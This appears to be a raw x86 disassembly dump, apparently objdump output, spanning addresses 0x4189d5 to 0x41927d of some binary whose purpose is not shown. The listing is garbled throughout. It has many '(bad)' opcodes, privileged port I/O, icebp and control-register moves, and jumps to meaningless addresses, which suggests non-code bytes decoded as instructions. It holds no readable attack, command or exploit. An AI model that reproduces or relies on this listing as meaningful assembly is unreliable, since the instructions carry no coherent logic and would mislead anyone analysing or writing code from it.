  4189d5:	ds inc eax
  4189d7:	add    al,dh
  4189d9:	cmp    eax,0xfe102040
  4189de:	aas    
  4189df:	add    BYTE PTR [eax],al
  4189e1:	add    BYTE PTR ds:[eax],al
  4189e4:	lock std 
  4189e6:	call   FWORD PTR [edi]
  4189e8:	loopne 0x4189e7
  4189ea:	aas    
  4189eb:	add    al,dl
  4189ed:	cmp    eax,0xfdd02000
  4189f2:	call   FWORD PTR [edi]
  4189f4:	lock cmp eax,0xfdf00000
  4189fa:	call   FWORD PTR [edi]
  4189fc:	loopne 0x418a3b
  4189fe:	inc    eax
  4189ff:	and    al,dl
  418a01:	cmp    eax,0xfda00040
  418a06:	aas    
  418a07:	and    BYTE PTR [eax-0x6fffbfc3],dh
  418a0d:	cmp    eax,0xfd902040
  418a12:	(bad)  
  418a13:	push   DWORD PTR [eax-0x3]
  418a16:	aas    
  418a17:	and    BYTE PTR [eax-0x3],dh
  418a1a:	(bad)  
  418a1b:	call   DWORD PTR [eax-0x6fffffc3]
  418a21:	std    
  418a22:	aas    
  418a23:	and    BYTE PTR [eax+0x3d],dh
  418a26:	inc    eax
  418a27:	add    BYTE PTR [eax+0x3d],ah
  418a2a:	add    BYTE PTR [eax],al
  418a2c:	pusha  
  418a2d:	std    
  418a2e:	aas    
  418a2f:	add    BYTE PTR [eax+0x6020003d],al
  418a35:	std    
  418a36:	(bad)  
  418a37:	inc    DWORD PTR [eax]
	...
  418a49:	add    BYTE PTR [eax],al
  418a4b:	add    BYTE PTR [eax+0x3d],ah
  418a4e:	inc    eax
  418a4f:	and    BYTE PTR [eax-0x3],dl
  418a52:	call   FWORD PTR [edi]
  418a54:	inc    eax
  418a55:	std    
  418a56:	aas    
  418a57:	add    BYTE PTR [eax],dh
  418a59:	cmp    eax,0x97392000
  418a5e:	add    DWORD PTR [eax],esp
  418a60:	cmp    DWORD PTR [ebp-0x6acadfff],edx
  418a66:	stc    
  418a67:	(bad)  
  418a68:	cmp    dl,BYTE PTR [edi-0x68c6ffff]
  418a6e:	stc    
  418a6f:	inc    DWORD PTR [esi]
  418a71:	xchg   ebp,eax
  418a72:	stc    
  418a73:	(bad)  
  418a74:	cmp    dl,BYTE PTR [ebp-0x68c6e007]
  418a7a:	stc    
  418a7b:	pop    ds
  418a7c:	xor    eax,0x3d1ff995
  418a81:	xchg   edi,eax
  418a82:	add    DWORD PTR [eax],esp
  418a84:	cmp    DWORD PTR [edi-0x6ac6ffff],edx
  418a8a:	add    DWORD PTR [eax],eax
  418a8c:	xor    eax,0x39000195
  418a91:	xchg   edi,eax
  418a92:	add    DWORD PTR [eax],eax
  418a94:	xor    eax,0x3d200195
  418a99:	xchg   ebp,eax
  418a9a:	stc    
  418a9b:	jmp    FWORD PTR [esi+0x3afff996]
  418aa1:	xchg   ebp,eax
  418aa2:	stc    
  418aa3:	pop    ds
  418aa4:	cmp    DWORD PTR [ebp-0x68c6dfff],edx
  418aaa:	stc    
  418aab:	(bad)  
  418aac:	cmp    dl,BYTE PTR [ebp+0x1]
	...
  418ac2:	add    BYTE PTR [eax],al
  418ac4:	cmp    eax,0x35200197
  418ac9:	xchg   edi,eax
  418aca:	stc    
  418acb:	pop    ds
  418acc:	cmp    eax,0x39200195
  418ad1:	xchg   edi,eax
  418ad2:	add    DWORD PTR [eax],esp
  418ad4:	cmp    eax,0x5efff997
  418ad9:	xchg   esp,eax
  418ada:	stc    
  418adb:	call   DWORD PTR [esi-0x6c]
  418ade:	stc    
  418adf:	pop    ds
  418ae0:	xor    eax,0x391ff997
  418ae5:	xchg   ebp,eax
  418ae6:	add    DWORD PTR [eax],eax
  418ae8:	cmp    DWORD PTR [eax],eax
  418aea:	out    0x3,eax
  418aec:	cmp    esp,edi
  418aee:	out    0xfb,al
  418af0:	dec    esi
  418af1:	add    bh,ah
  418af3:	add    edi,DWORD PTR [ecx]
  418af5:	cld    
  418af6:	out    0xfb,al
  418af8:	ds add bh,ah
  418afb:	add    ebx,DWORD PTR [ecx+0x0]
  418afe:	jmp    0xe94599fe
  418b03:	sti    
  418b04:	push   es
  418b05:	add    al,0xe9
  418b07:	add    ebx,DWORD PTR [ecx-0x4]
  418b0a:	call   0xe93da412
  418b0f:	add    edi,DWORD PTR [ecx]
  418b11:	add    cl,ch
  418b13:	add    ebx,DWORD PTR [ecx]
  418b15:	add    bh,ah
  418b17:	add    edi,DWORD PTR [ecx]
  418b19:	cld    
  418b1a:	out    0xfb,al
  418b1c:	(bad)  
  418b1d:	add    esp,edi
  418b1f:	add    ebx,DWORD PTR [ecx]
  418b21:	add    bh,ah
  418b23:	sti    
  418b24:	es cld 
  418b26:	call   0x418c26
	...
  418b3b:	add    BYTE PTR [esi+0x56fbe987],bh
  418b41:	add    bh,ah
  418b43:	sti    
  418b44:	dec    esi
  418b45:	cld    
  418b46:	call   0xe9c93246
  418b4b:	add    edi,DWORD PTR [ecx]
  418b4d:	cld    
  418b4e:	call   0xe73dc24e
  418b53:	add    ebx,DWORD PTR [ecx-0x4]
  418b56:	out    0xfb,al
  418b58:	es add bh,ah
  418b5b:	add    edi,DWORD PTR [ecx]
  418b5d:	add    cl,ch
  418b5f:	add    edi,DWORD PTR [ecx]
  418b61:	add    cl,ch
  418b63:	sti    
  418b64:	dec    esi
  418b65:	cld    
  418b66:	out    0x3,al
  418b68:	cmp    DWORD PTR [eax],eax
  418b6a:	jmp    0xe741ca6a
  418b6f:	add    ebx,DWORD PTR [ecx]
  418b71:	cld    
  418b72:	out    0xfb,al
  418b74:	dec    esi
  418b75:	xchg   DWORD PTR [eax],eax
  418b77:	jmp    0x418bb3
  418b79:	add    BYTE PTR [ecx+ebp*8],al
  418b7c:	inc    edx
  418b7d:	xchg   DWORD PTR [ecx],eax
  418b7f:	jmp    0xec3f12b6
  418b84:	cmp    ah,al
  418b86:	jmp    FWORD PTR [eax]
  418b88:	sub    eax,0x2ae90d87
  418b8d:	xchg   ebp,edi
  418b8f:	jmp    0x294187ce
  418b94:	add    eax,0x3ae91003
  418b99:	add    BYTE PTR [eax],dl
  418b9b:	sub    DWORD PTR ds:0xa90d87,eax
	...
  418bb1:	add    BYTE PTR [eax],al
  418bb3:	add    BYTE PTR [edx],bh
  418bb5:	add    BYTE PTR [eax],al
  418bb7:	jmp    0xa9518bf6
  418bbc:	cmp    bh,ah
  418bbe:	(bad)  
  418bbf:	call   0xa95187fe
  418bc4:	retf   0x1002
  418bc7:	jmp    0xe9418e96
  418bcc:	retf   0x1002
  418bcf:	test   eax,0xe90002ca
  418bd4:	stos   BYTE PTR es:[edi],al
  418bd5:	xchg   ch,bh
  418bd7:	test   eax,0xe900003a
  418bdc:	cmp    bh,ah
  418bde:	pop    gs
  418be0:	cmp    al,BYTE PTR [eax]
  418be2:	adc    cl,ch
  418be4:	mov    al,BYTE PTR [esi-0x797556f3]
  418bea:	std    
  418beb:	jmp    0xa9418e7a
  418bf0:	cmp    bh,ah
  418bf2:	jmp    FWORD PTR [eax]
  418bf4:	cmp    eax,0x6ae90ffc
  418bf9:	add    dl,BYTE PTR [eax]
  418bfb:	sub    DWORD PTR [ebp-0x7a],ebp
  418bfe:	std    
  418bff:	jmp    0x418c3e
  418c04:	pusha  
  418c05:	add    al,BYTE PTR [eax]
  418c07:	add    BYTE PTR [eax],ah
  418c09:	cld    
  418c0a:	add    edx,DWORD PTR [eax]
  418c0c:	adc    ah,bh
  418c0e:	dec    DWORD PTR [edi]
  418c10:	push   eax
  418c11:	xchg   edx,eax
  418c12:	std    
  418c13:	punpcklbw mm1,DWORD PTR [ecx+eax*1+0x0]
	...
  418c2b:	add    BYTE PTR [eax],ah
  418c2d:	add    al,BYTE PTR [eax+eax*1]
  418c30:	push   eax
  418c31:	mov    WORD PTR [ecx],es
  418c33:	add    BYTE PTR [eax],dl
  418c35:	add    al,BYTE PTR [eax+eax*1]
  418c38:	and    BYTE PTR [edx-0x6ddfefff],dl
  418c3e:	std    
  418c3f:	call   DWORD PTR [eax-0x4]
  418c42:	(bad)  
  418c43:	call   DWORD PTR [eax-0x4]
  418c46:	add    edx,DWORD PTR [eax]
  418c48:	loopne 0x418bdb
  418c4a:	std    
  418c4b:	jmp    DWORD PTR [eax-0x2ffffe6f]
  418c51:	xchg   ecx,eax
  418c52:	std    
  418c53:	seto   BYTE PTR [ecx]
  418c56:	add    BYTE PTR [eax],al
  418c58:	mov    al,ds:0xe0100001
  418c5d:	add    DWORD PTR [eax+edx*1],eax
  418c60:	nop
  418c61:	add    DWORD PTR [eax+edx*1],eax
  418c64:	rol    BYTE PTR [ecx],1
  418c66:	add    BYTE PTR [eax],dl
  418c68:	mov    al,ds:0xe0000401
  418c6d:	xchg   ecx,eax
  418c6e:	std    
  418c6f:	seto   BYTE PTR [ecx]
  418c72:	add    BYTE PTR [eax],al
  418c74:	rcl    BYTE PTR [ecx+0x1e01001],1
  418c7a:	add    al,0x0
  418c7c:	loopne 0x418c7f
  418c7e:	add    BYTE PTR [eax],dl
  418c80:	nop
  418c81:	add    DWORD PTR [eax+edx*1],eax
  418c84:	nop
  418c85:	xchg   ecx,eax
  418c86:	std    
  418c87:	mov    esp,cr1
  418c8a:	std    
  418c8b:	punpcklbw mm0,DWORD PTR [ecx]
	...
  418ca2:	add    BYTE PTR [eax],al
  418ca4:	cmp    edi,edx
  418ca6:	repz add ecx,DWORD PTR [ecx-0x69]
  418caa:	icebp  
  418cab:	add    edi,DWORD PTR [ecx]
  418cad:	xchg   edi,eax
  418cae:	icebp  
  418caf:	add    edi,DWORD PTR [ecx]
  418cb1:	xlat   BYTE PTR ds:[ebx]
  418cb2:	repz inc DWORD PTR [esi-0x29]
  418cb6:	repz (bad) 
  418cb8:	xlat   BYTE PTR ds:[ebx]
  418cba:	add    eax,DWORD PTR [ecx+edi*1]
  418cbd:	xchg   edi,eax
  418cbe:	add    DWORD PTR [eax],eax
  418cc0:	dec    ecx
  418cc1:	xchg   edi,eax
  418cc2:	icebp  
  418cc3:	add    ecx,DWORD PTR [ecx-0x61]
  418cc6:	sub    edi,edi
  418cc8:	push   ds
  418cc9:	xchg   edi,eax
  418cca:	add    DWORD PTR [eax],eax
  418ccc:	cmp    DWORD PTR [edi+0x3f390001],edx
  418cd2:	sub    bh,bh
  418cd4:	push   es
  418cd5:	and    ebp,DWORD PTR [ecx]
  418cd7:	(bad)  
  418cd8:	(bad)  
  418cd9:	jb     0x418d07
  418cdb:	push   esi
  418cdd:	xchg   esi,eax
  418cde:	add    DWORD PTR [eax],eax
  418ce0:	cmp    DWORD PTR [edi-0xec6ffff],edx
  418ce6:	es (bad) 
  418ce8:	fidivr WORD PTR [esi+0x3ed6ff2b]
  418cee:	sub    al,0xff
  418cf0:	into   
  418cf1:	xchg   esi,eax
  418cf2:	add    DWORD PTR [eax],eax
  418cf4:	cmp    DWORD PTR [edi+0x67390001],edx
  418cfa:	sub    bh,bh
  418cfc:	mov    dh,0x12
  418cfe:	jmp    FWORD PTR cs:[esi-0x5900d56a]
  418d05:	xchg   esi,eax
  418d06:	add    DWORD PTR [eax],eax
	...
  418d1c:	cmp    DWORD PTR [edi-0x6cc6ffff],edx
  418d22:	and    edi,edi
  418d24:	mov    ss,WORD PTR [edx]
  418d26:	inc    DWORD PTR cs:[esi+0x7eff2aba]
  418d2d:	xchg   esi,eax
  418d2e:	add    DWORD PTR [eax],eax
  418d30:	cmp    DWORD PTR [eax],eax
  418d32:	out    0x3,eax
  418d34:	cmp    DWORD PTR [eax],eax
  418d36:	or     DWORD PTR [esi+eiz*2],esp
  418d39:	test   BYTE PTR [edi+0x13845e2d],cl
  418d3f:	sub    edx,DWORD PTR [esi-0x7c]
  418d42:	out    0x3,eax
  418d44:	cmp    DWORD PTR [eax],eax
  418d46:	out    0x3,eax
  418d48:	cmp    DWORD PTR [eax],eax
  418d4a:	(bad)  
  418d4c:	test   BYTE PTR ds:[edi+0x2784362d],ah
  418d53:	sub    ebp,DWORD PTR [esi]
  418d55:	test   bh,ah
  418d57:	add    edi,DWORD PTR [ecx]
  418d59:	add    bh,ah
  418d5b:	add    edi,DWORD PTR [ecx]
  418d5d:	add    BYTE PTR [ecx+0x23],al
  418d60:	push   ss
  418d61:	test   BYTE PTR [ebx+0x1b840e2d],dh
  418d67:	sub    eax,DWORD PTR [esi]
  418d69:	test   bh,ah
  418d6b:	add    edi,DWORD PTR [ecx]
  418d6d:	add    bh,ah
  418d6f:	add    edi,DWORD PTR [ecx]
  418d71:	add    BYTE PTR [ecx],dl
  418d73:	and    ebp,esi
  418d75:	or     DWORD PTR [edi+0x2d],0xffffffe6
  418d79:	sbb    DWORD PTR [edi+0x2a],0xffffffde
  418d7d:	and    edi,0x3
	...
  418d94:	cmp    DWORD PTR [eax],eax
  418d96:	out    0x3,eax
  418d98:	cmp    DWORD PTR [eax],eax
  418d9a:	popf   
  418d9b:	and    al,dh
  418d9d:	sbb    ebx,0x2c
  418da0:	mov    esi,0x3903e783
  418da5:	add    bh,ah
  418da7:	add    edi,DWORD PTR [ecx]
  418da9:	add    bh,ah
  418dab:	add    edi,DWORD PTR [ecx]
  418dad:	add    bh,ah
  418daf:	add    edi,DWORD PTR [ecx]
  418db1:	add    bh,ah
  418db3:	add    edi,DWORD PTR [ecx]
  418db5:	add    bh,al
  418db7:	sub    al,0x8e
  418db9:	or     ebp,0x2c
  418dbc:	xchg   BYTE PTR [ebx-0x7cb24d00],al
  418dc2:	std    
  418dc3:	mov    eax,ds:0x3dfd8325
  418dc8:	and    al,BYTE PTR [ebx-0x7cedb603]
  418dce:	std    
  418dcf:	inc    edi
  418dd0:	adc    al,BYTE PTR [ebx-0x7cddb003]
  418dd6:	std    
  418dd7:	jae    0x418dfb
  418dd9:	cmp    ebp,0x61
  418ddc:	adc    al,BYTE PTR [ebx-0x7ced7203]
  418de2:	std    
  418de3:	jns    0x418e47
  418de5:	cmp    ebp,0xffffffaf
  418de8:	bound  eax,QWORD PTR [ebx-0x7cad7403]
  418dee:	std    
  418def:	cdq    
  418df0:	push   edx
  418df1:	cmp    ebp,0xffffffe7
  418df4:	pop    esi
  418df5:	cmp    ebp,0xffffffdf
	...
  418e0c:	push   esi
  418e0d:	cmp    ebp,0xffffffd1
  418e10:	pop    esi
  418e11:	cmp    ebp,0xffffffb1
  418e14:	push   esi
  418e15:	cmp    ebp,0x23
  418e18:	and    DWORD PTR [ebx-0x7ce93c03],eax
  418e1e:	std    
  418e1f:	iret   
  418e20:	push   ds
  418e21:	cmp    ebp,0xffffffd5
  418e24:	push   ss
  418e25:	cmp    ebp,0x79
  418e28:	and    DWORD PTR [ebx-0x7cde7003],eax
  418e2e:	std    
  418e2f:	adc    DWORD PTR [ecx],0x112dfd83
  418e35:	cmp    ebp,0x15
  418e38:	popa   
  418e39:	cmp    ebp,0x9
  418e3c:	popa   
  418e3d:	cmp    ebp,0x15
  418e40:	push   ecx
  418e41:	cmp    ebp,0xffffffed
  418e44:	push   ecx
  418e45:	cmp    ebp,0xfffffff7
  418e48:	popa   
  418e49:	cmp    ebp,0x0
  418e4c:	jle    0x418e25
  418e4e:	cld    
  418e4f:	inc    esi
  418e51:	xlat   BYTE PTR ds:[ebx]
  418e52:	cld    
  418e53:	jmp    FWORD PTR [edx-0xd000329]
  418e59:	xlat   BYTE PTR ds:[ebx]
  418e5a:	cld    
  418e5b:	call   esi
  418e5d:	fdivr  st,st(4)
  418e5f:	push   DWORD PTR [eax-0x37000329]
  418e65:	xlat   BYTE PTR ds:[ebx]
  418e66:	cld    
  418e67:	call   DWORD PTR [eax-0x6b000329]
  418e6d:	xlat   BYTE PTR ds:[ebx]
  418e6e:	cld    
  418e6f:	inc    DWORD PTR [eax]
	...
  418e81:	add    BYTE PTR [eax],al
  418e83:	add    BYTE PTR [edx+0x52fffcd7],al
  418e89:	fdiv   st(4),st
  418e8b:	call   FWORD PTR [edx]
  418e8d:	fdiv   st(4),st
  418e8f:	inc    DWORD PTR [eax]
  418e91:	fdiv   st(4),st
  418e93:	inc    DWORD PTR [eax]
  418e95:	fdiv   st(4),st
  418e97:	call   DWORD PTR [edx+ebx*8-0x4]
  418e9b:	jmp    DWORD PTR [esi-0x26]
  418e9e:	cld    
  418e9f:	jmp    DWORD PTR [edx+ebx*8]
  418ea2:	cld    
  418ea3:	inc    DWORD PTR [esp+ebx*8]
  418ea6:	cld    
  418ea7:	call   DWORD PTR [ebx+ebx*8-0x24750004]
  418eae:	cld    
  418eaf:	jmp    eax
  418eb1:	std    
  418eb2:	(bad)  
  418eb3:	call   FWORD PTR [esi]
  418eb5:	(bad)  
  418eb7:	jmp    DWORD PTR [esi]
  418eb9:	(bad)  
  418ebb:	jmp    FWORD PTR [esi-0x25]
  418ebe:	cld    
  418ebf:	(bad)  
  418ec0:	(bad)  
  418ec2:	cld    
  418ec3:	(bad)  
  418ec4:	out    dx,al
  418ec5:	(bad)  
  418ec7:	(bad)  
  418ec8:	cmp    bl,cl
  418eca:	cld    
  418ecb:	jmp    DWORD PTR [eax-0x23000003]
  418ed1:	(bad)  
  418ed3:	call   DWORD PTR [eax+0x39fffffd]
  418ed9:	dec    ebx
  418eda:	call   DWORD PTR es:[esi-0x7100d9fd]
  418ee1:	pop    ss
  418ee2:	inc    DWORD PTR es:[esi+0xff2611]
	...
  418ef9:	add    BYTE PTR [eax],al
  418efb:	add    BYTE PTR [esi+0x2b],bh
  418efe:	push   DWORD PTR es:[esi-0x3d]
  418f02:	and    eax,0x235b6eff
  418f07:	jmp    DWORD PTR [esi+0x51]
  418f0a:	and    edi,edi
  418f0c:	pop    esi
  418f0d:	dec    ecx
  418f0e:	and    edi,edi
  418f10:	push   esi
  418f11:	stos   DWORD PTR es:[edi],eax
  418f12:	and    edi,edi
  418f14:	dec    esi
  418f15:	xchg   edi,eax
  418f16:	add    DWORD PTR [eax],eax
  418f18:	cmp    DWORD PTR [ebp-0x68c100df],esp
  418f1e:	add    DWORD PTR [eax],eax
  418f20:	cmp    DWORD PTR [ecx-0x2ad100df],eax
  418f26:	and    edi,edi
  418f28:	es xchg edi,eax
  418f2a:	add    DWORD PTR [eax],eax
  418f2c:	cmp    ebx,esi
  418f2e:	and    edi,edi
  418f30:	push   ss
  418f31:	out    0x23,eax
  418f33:	dec    DWORD PTR [esi]
  418f35:	sti    
  418f36:	and    edi,edi
  418f38:	push   es
  418f39:	mov    edi,tr7
  418f3c:	(bad)  
  418f3d:	and    al,0x24
  418f3f:	push   esi
  418f41:	xor    BYTE PTR [edi+edi*8],ah
  418f44:	out    dx,al
  418f45:	xchg   esi,eax
  418f46:	add    DWORD PTR [eax],eax
  418f48:	cmp    DWORD PTR [ecx+0x24],ebp
  418f4b:	(bad)  
  418f4c:	(bad)  
  418f4e:	and    edi,edi
  418f50:	(bad)  
  418f51:	les    esp,FWORD PTR [ebx]
  418f53:	dec    esi
  418f55:	fisub  DWORD PTR [ebx]
  418f57:	inc    esi
  418f59:	cmp    BYTE PTR [edi+edi*8],ah
  418f5c:	mov    esi,0xff23c2
	...
  418f71:	add    BYTE PTR [eax],al
  418f73:	add    BYTE PTR [esi-0x5100dc2e],dh
  418f79:	(bad)  
  418f7a:	in     al,dx
  418f7b:	and    ah,BYTE PTR [esi-0x61dd1280]
  418f81:	xor    bl,0x22
  418f84:	xchg   esi,eax
  418f85:	and    bh,0x3
  418f88:	cmp    DWORD PTR [eax],eax
  418f8a:	mov    ebp,0xb1808622
  418f8f:	and    bh,BYTE PTR [esi-0x80]
  418f92:	out    0x3,eax
  418f94:	cmp    DWORD PTR [eax],eax
  418f96:	(bad)  
  418f97:	sub    BYTE PTR [esi-0x80],ch
  418f9a:	adc    eax,0x21806629
  418f9f:	sub    DWORD PTR [esi-0x80],ebx
  418fa2:	pop    ds
  418fa3:	sub    DWORD PTR [esi-0x80],edx
  418fa6:	xor    ebp,DWORD PTR [ecx]
  418fa8:	dec    esi
  418fa9:	add    BYTE PTR [edi+0x29],0x46
  418fad:	or     BYTE PTR [ebp+0x29],0x3e
  418fb1:	xor    BYTE PTR ds:0x61803629,0x28
  418fb8:	cmp    BYTE PTR cs:[edi+0x28],0x26
  418fbd:	add    BYTE PTR [ebx+0x28],0x1e
  418fc1:	adc    BYTE PTR [edi+0x28],0x16
  418fc5:	and    BYTE PTR [ebp-0x767ff1d8],0x28
  418fcc:	push   es
  418fcd:	xor    BYTE PTR [edi+0x28],0xfe
  418fd1:	jg     0x418fc0
  418fd3:	daa    
  418fd4:	idiv   BYTE PTR [edi-0x2b]
  418fd7:	daa    
	...
  418fec:	out    dx,al
  418fed:	jg     0x418ffe
  418fef:	sub    dh,ah
  418ff1:	jg     0x419012
  418ff3:	sub    dh,bl
  418ff5:	jg     0x418f98
  418ff7:	daa    
  418ff8:	(bad)  
  418ff9:	jg     0x418fac
  418ffb:	daa    
  418ffc:	into   
  418ffd:	jg     0x418fd4
  418fff:	daa    
  419000:	(bad)  
  419001:	jg     0x418fbe
  419003:	daa    
  419004:	mov    esi,0x5e59007f
  419009:	jg     0x419008
  41900b:	xchg   DWORD PTR [esi+0x7f],edx
  41900e:	std    
  41900f:	popa   
  419010:	pop    esi
  419011:	jg     0x419010
  419013:	and    eax,0x3dfd7f56
  419018:	pop    esi
  419019:	jg     0x419018
  41901b:	or     DWORD PTR [esi+0x7f],edx
  41901e:	std    
  41901f:	std    
  419020:	pop    edi
  419021:	jg     0x419020
  419023:	in     eax,0x57
  419025:	jg     0x419024
  419027:	fistp  WORD PTR [edi]
  419029:	jg     0x419028
  41902b:	(bad)  
  41902c:	pop    ss
  41902d:	jg     0x41902c
  41902f:	daa    
  419030:	pop    eax
  419031:	jle    0x419030
  419033:	inc    ebx
  419034:	pop    eax
  419035:	jle    0x419034
  419037:	pop    ebx
  419038:	pop    eax
  419039:	jle    0x419038
  41903b:	dec    edi
  41903c:	pop    eax
  41903d:	jle    0x41903c
  41903f:	mov    DWORD PTR [eax+0x7e],ebx
  419042:	std    
  419043:	sbb    DWORD PTR [eax+0x7e],0x7e1899fd
  41904a:	std    
  41904b:	lea    ebx,[eax]
  41904d:	jle    0x41904c
  41904f:	fwait
	...
  419064:	sbb    BYTE PTR [esi-0x3],bh
  419067:	jmp    0x419081
  419069:	jle    0x419068
  41906b:	jecxz  0x419085
  41906d:	jle    0x41906c
  41906f:	leave  
  419070:	sbb    BYTE PTR [esi-0x3],bh
  419073:	mov    ecx,0x2dfd7e18
  419078:	sbb    edi,DWORD PTR [esi-0x3]
  41907b:	pop    ss
  41907c:	fstp   TBYTE PTR [ebp-0x3]
  41907f:	std    
  419080:	fdivr  DWORD PTR [ebp-0x3]
  419083:	in     eax,0xd8
  419085:	jge    0x419084
  419087:	ins    DWORD PTR es:[edi],dx
  419088:	fstp   TBYTE PTR [ebp-0x3]
  41908b:	jae    0x419068
  41908d:	jge    0x41908c
  41908f:	jmp    0x4190ce
  419094:	push   ss
  419095:	(bad)  
  419096:	(bad)  
  419097:	call   FWORD PTR [esi]
  419099:	(bad)  
  41909a:	(bad)  
  41909b:	push   DWORD PTR [esi+0x62]
  41909e:	(bad)  
  41909f:	call   DWORD PTR [esi-0x5900019f]
  4190a5:	popa   
  4190a6:	(bad)  
  4190a7:	dec    DWORD PTR [edx-0x5f00019f]
  4190ad:	add    al,BYTE PTR [eax]
  4190af:	add    ah,dl
  4190b1:	popa   
  4190b2:	(bad)  
  4190b3:	call   DWORD PTR [eax-0x63fffffe]
  4190b9:	popa   
  4190ba:	(bad)  
  4190bb:	(bad)  
  4190bc:	mov    esp,0xe0fffe61
  4190c1:	(bad)  
  4190c2:	(bad)  
  4190c3:	(bad)  
  4190c4:	out    dx,al
  4190c5:	popa   
  4190c6:	(bad)  
  4190c7:	inc    DWORD PTR [eax]
	...
  4190d9:	add    BYTE PTR [eax],al
  4190db:	add    ah,bl
  4190dd:	popa   
  4190de:	(bad)  
  4190df:	(bad)  
  4190e0:	mov    esp,0xbcfffe61
  4190e5:	popa   
  4190e6:	(bad)  
  4190e7:	dec    DWORD PTR [esi-0x6100019f]
  4190ed:	popa   
  4190ee:	(bad)  
  4190ef:	push   esp
  4190f1:	(bad)  
  4190f2:	(bad)  
  4190f3:	jmp    DWORD PTR [eax]
  4190f5:	add    al,BYTE PTR [eax]
  4190f7:	add    BYTE PTR [edx],ah
  4190f9:	(bad)  
  4190fa:	(bad)  
  4190fb:	call   DWORD PTR [eax]
  4190fd:	add    al,BYTE PTR [eax]
  4190ff:	add    dh,bh
  419101:	popa   
  419102:	(bad)  
  419103:	jmp    DWORD PTR [edx+0x64]
  419106:	(bad)  
  419107:	call   DWORD PTR [eax]
  419109:	add    al,BYTE PTR [eax]
  41910b:	add    BYTE PTR [esp+eiz*2],dh
  41910e:	(bad)  
  41910f:	push   eax
  419111:	popa   
  419112:	(bad)  
  419113:	(bad)  
  419114:	fsub   QWORD PTR [ecx-0x2]
  419117:	jmp    FWORD PTR [eax+0x61]
  41911a:	(bad)  
  41911b:	jmp    DWORD PTR [edx+0x61]
  41911e:	(bad)  
  41911f:	(bad)  
  419120:	cmp    ebp,esi
  419122:	loopne 0x419122
  419124:	into   
  419125:	add    DWORD PTR [bx+si],eax
  419128:	cmp    ebp,edi
  41912a:	loopne 0x41912a
  41912c:	mov    esi,0xb6fee129
  419131:	sbb    ecx,esp
  419133:	(bad)  
  419134:	scas   al,BYTE PTR es:[edi]
  419135:	or     esp,ecx
  419137:	(bad)  
  419138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419139:	or     eax,0x139efee1
  41913e:	loope  0x41913e
	...
  419154:	xchg   esi,eax
  419155:	adc    esp,ecx
  419157:	dec    BYTE PTR [esi-0x79011b9b]
  41915d:	jne    0x419143
  41915f:	(bad)  
  419160:	jle    0x4191bd
  419162:	in     al,0xfe
  419164:	jbe    0x4191cd
  419166:	add    DWORD PTR [eax],eax
  419168:	cmp    DWORD PTR [ebp+0x3166fee4],esi
  41916e:	loope  0x41916e
  419170:	pop    esi
  419171:	add    DWORD PTR [bx+si],eax
  419174:	cmp    DWORD PTR [esp+eax*1],edx
  419177:	inc    ecx
  419178:	retf   
  419179:	ret    
  41917a:	loopne 0x4191ef
  41917c:	fsubr  QWORD PTR [ecx+ebp*8]
  41917f:	imul   edx,esp,0x27
  419182:	add    al,0x3f
  419184:	cmp    ebx,DWORD PTR [ecx]
  419186:	in     eax,0x5e
  419188:	xchg   ebp,eax
  419189:	and    eax,0x679c6be9
  41918e:	add    DWORD PTR [ecx],esp
  419190:	cmp    DWORD PTR [edx],ebp
  419192:	lock ins BYTE PTR es:[edi],dx
  419194:	mov    cl,BYTE PTR [esp+ecx*8]
  419197:	pop    esi
  419198:	lahf   
  419199:	add    esi,eax
  41919b:	bound  edi,QWORD PTR [ecx]
  41919d:	add    BYTE PTR [esi],0x55
  4191a0:	mov    edx,DWORD PTR [eax]
  4191a2:	clc    
  4191a3:	bound  edi,QWORD PTR [edi+0x0]
  4191a6:	lock bound edi,QWORD PTR [ecx]
  4191a9:	dec    esp
  4191aa:	add    al,0x6c
  4191ac:	push   0x0
  4191ae:	fcomi  st,st(5)
  4191b0:	push   edx
  4191b1:	jecxz  0x41917f
  4191b3:	ret    0x7cd6
  4191b6:	xchg   edi,eax
  4191b7:	add    eax,DWORD PTR [eax]
	...
  4191c9:	add    BYTE PTR [eax],al
  4191cb:	add    BYTE PTR [esp+ebp*8-0x43],dh
  4191cf:	in     eax,0x67
  4191d1:	in     al,dx
  4191d2:	mov    dl,0xf0
  4191d4:	pop    ecx
  4191d5:	jmp    0xff2d95c0
  4191da:	lods   eax,DWORD PTR ds:[esi]
  4191db:	out    dx,eax
  4191dc:	sbb    eax,0xbefc7e2
  4191e1:	out    dx,al
  4191e2:	xchg   edx,eax
  4191e3:	lock sbb ecx,ebp
  4191e6:	out    0x3,al
  4191e8:	(bad)  
  4191e9:	(bad)  
  4191ea:	mov    ds:0x7adf19f0,al
  4191ef:	leave  
  4191f0:	or     bl,ah
  4191f2:	mov    eax,DWORD PTR [ebx]
  4191f4:	mov    esi,edi
  4191f6:	stos   BYTE PTR es:[edi],al
  4191f7:	lock (bad) 
  4191fa:	add    dl,0xe2
  4191fd:	jmp    0x41927c
  4191ff:	in     al,0x66
  419201:	jl     0x419203
  419203:	add    eax,0xf652f0cd
  419208:	(bad)  
  41920a:	dec    edi
  41920b:	ret    
  41920c:	dec    esi
  41920d:	jl     0x419209
  41920f:	add    al,0xd5
  419211:	lock cmp dh,dh
  419214:	(bad)  
  419216:	xor    al,bl
  419218:	ss jl  0x4191f9
  41921b:	add    dh,BYTE PTR [ebp+eiz*8+0x32]
  41921f:	retf   0xec9f
  419222:	or     eax,ebx
  419224:	stos   BYTE PTR es:[edi],al
  419225:	hlt    
  419226:	sbb    bl,ch
  419228:	cwde   
  419229:	cmc    
  41922a:	sbb    ah,bh
  41922c:	mov    ecx,eax
  41922e:	out    0x3,al
	...
  419244:	mov    ds:0x8efc2c00,al
  419249:	loope  0x419257
  41924b:	call   0xff417ccb
  419250:	jecxz  0x419243
  419252:	ins    BYTE PTR es:[edi],dx
  419253:	call   edi
  419255:	fisubr WORD PTR [ebp-0x23]
  419258:	add    eax,0xc8d071f0
  41925d:	in     al,0x70
  41925f:	test   al,0x3a
  419261:	sbb    al,0xff
  419263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419264:	fucomip st,st(7)
  419266:	inc    ebp
  419267:	ror    dh,1
  419269:	ficom  WORD PTR [eax-0x30]
  41926c:	mov    ah,0xde
  41926e:	push   esi
  419270:	cmp    al,cl
  419272:	jno    0x419238
  419274:	fwait
  419275:	out    dx,eax
  419276:	bound  ebp,QWORD PTR [edi-0x539d186d]
  41927c:	fwait
  41927d:	jmp    0x4192ee
